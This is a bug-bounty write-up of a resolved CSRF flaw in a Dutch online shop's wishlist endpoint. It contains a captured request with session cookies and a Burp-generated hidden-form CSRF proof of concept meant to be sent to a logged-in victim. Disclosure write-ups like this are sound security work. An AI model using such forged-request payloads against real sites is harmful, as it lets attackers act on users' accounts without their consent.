---
title: CSRF Injection on the biggest online-shop in Netherland [Bug Hunting]
updated: 2020-03-19 11:28
---

My first valid resolved Bug Writeup is here. I was invited to a private program on one of the biggest online-shopping, so I started doing some basic scanning.
I found that website acts weirdly when I perform CSRF. 
**On attacker:**
We create a simple account and capture the request on Burp when we add a product to our wishlist.

```http
POST /service/wishlist/wishlist HTTP/1.1
Host: www.example-website.nl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: none/none
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.example-website.nl/
Content-Type: application/json
Blaze-CSRF: undefined
Origin: https://www.example-website.nl
Content-Length: 40
Connection: close
Cookie: fsrn=2; fsreset2=Wed_18_Mar_2020_22_54_40_GMT; identifier=4339d3b6-2610-422c-82b0-9b04f7a43b58; token=random_json_token_here; user-data=same_data_here=; csrf=bece68d7-333b-4928-9cb0-c19d93d1abb5; _ga=GA1.2.1009191194.1584572081; _ga_ZY7P8KFBPN=GS1.1.1587228541.7.0.1587228541.0; _dvp=0:k7xxaz5p:N0836XsY7brMdb65ime4s1tlX2bOgxwe; cookies=accept; _gcl_au=1.1.1550199358.1584572206; cto_bundle=2v43UF9VUThPM05JekQzeVk3cGRObnVwWWEwZEpOWnl2dlpwbUJvVU8wNnhxekExVVNLdUphdXdTdHpTV21ocUdoZGRJJTJGOXRtUkFXUTkzS2g5UHB5eVcwSEJvS0UlMkY3TSUyRiUyRlVrRUQwSUpMWU9IVllJN2xaUWNkSVYyOEElMkJhd1BBV1hwZFBHbiUyRm1HMEVTYTVFU0NOTkhOWVlBaTZHYWhtcUpsZlVoOThvS1dEV1dWRTVlTXhNdXpVcDlBZVVJMDhheGozMmk; _fbp=fb.1.1584572548344.1088712622; BVBRANDID=fb63c020-cb02-4001-9aaf-3a86f79ba5c7; fita.sid=GcfRuiCcumSNg8cS6CDcQwVsYKInN15v; _hjid=c1509864-a77b-4b7f-bfc9-076a83f11f4d; optimizelyEndUserId=oeu1584722868093r0.06827504906625659; tl_sid=2a77e76a226b4db2b573196a38c3545c; nefspe=2; __cfduid=d298a07db320e91fcbf533e7f069d14de1587228538; browser-session-id=f3cc2b56-82bb-4060-a2cd-eade6f149808; lux_uid=158722853903320907; _dvs=0:k95uw4sf:Us6HCuZajpYgx7oitmBVL4ra2PPeP8Ig; _uetsid=_uet068cc821-8ad2-7f2f-c994-4ab86b261199; _gid=GA1.2.183840546.1587228542; _dc_gtm_UA-46485659-10=1; _gat_UA-46485659-10=1

{"items":[{"productNumber":"16457804"}]}
```

Using this request, we generate a CSRF PoC. (again using Burp Suite)

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://www.example-website.nl/service/wishlist/wishlist" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;items&quot;&#58;&#91;&#123;&quot;productNumber&quot;&#58;&quot;16457804&quot;&#125;&#93;&#125;" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
Send the generated HTML to the victim.

**On victim**
Open the file received from attacker (while he is already logged in the website). The product will be added on the wishlist.

## Impact

The attacker can perform different unwanted action on user, such as buying products, add/remove products from wishlist and so on.



